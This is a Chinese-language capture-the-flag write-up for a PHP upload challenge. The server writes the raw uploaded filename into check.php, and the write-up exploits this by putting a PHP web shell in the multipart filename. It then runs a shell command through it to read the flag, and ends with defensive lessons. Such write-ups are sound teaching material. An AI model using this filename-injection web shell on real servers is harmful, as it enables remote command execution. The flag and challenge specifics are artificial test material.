# 我只想要你的 PNG！

## 题目简述

上传接口只按客户端文件名判断 `.png` 后缀，却把未经转义的原始文件名追加写入可执行的 `check.php`。因此控制 multipart 请求中的 `filename`，即可向现有 PHP 文件注入代码；上传文件正文是否为 PHP 并不重要。

## 解题过程

服务端的关键顺序如下：

```php
$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
if (in_array($ext, ['png'])) {
    $file_name = $file['name'];
    file_put_contents('check.php', "{$file_name}.", FILE_APPEND);
    $saveName = md5(uniqid() . $file['name']) . '.' . $ext;
    $savePath = $uploadDir . '/' . $saveName;
    move_uploaded_file($file['tmp_name'], $savePath);
}
```

后缀检查与写入操作使用的是同一个原始文件名。只要文件名最后仍是 `.png`，前面的内容就会原样进入 `check.php`。例如在拦截的 multipart 请求中修改 `Content-Disposition`：

```http
Content-Disposition: form-data; name="avatar"; filename="<?php system($_GET['cmd']);?>.png"
Content-Type: image/png

PNG
```

`pathinfo()` 得到的扩展名仍为 `png`，而 `check.php` 尾部会新增：

```php
<?php system($_GET['cmd']);?>.png.
```

随后直接访问：

```text
/check.php?cmd=cat%20/ffllaagg
```

即可得到：

```text
0xGame{I_Only_Love_PNG_md}
```

这里的真实 flag 路径是仓库 `Dockerfile` 写入的 `/ffllaagg`；`check.php` 原本打印的 `flag` 只是伪装成根目录列表的提示文本。上传后页面给出的 `uploads/<hash>.png` 可能返回 404，是因为源码没有定义 `$uploadDir`，也没有检查 `move_uploaded_file()` 是否成功，但文件名早已在移动操作之前写入 `check.php`，不影响利用。

## 方法总结

- 核心问题不是普通的“上传 PHP 文件”，而是未经转义的上传文件名被写入 PHP 源文件。
- `accept="image/*"`、客户端 MIME 类型和文件名后缀都不能证明文件可信；服务端还应校验内容，并把用户数据写入不可执行目录。
- 遇到页面提示路径与实际现象矛盾时，应继续追踪源码的变量初始化和返回值检查，本题的 404 正是未定义上传目录造成的旁支现象。
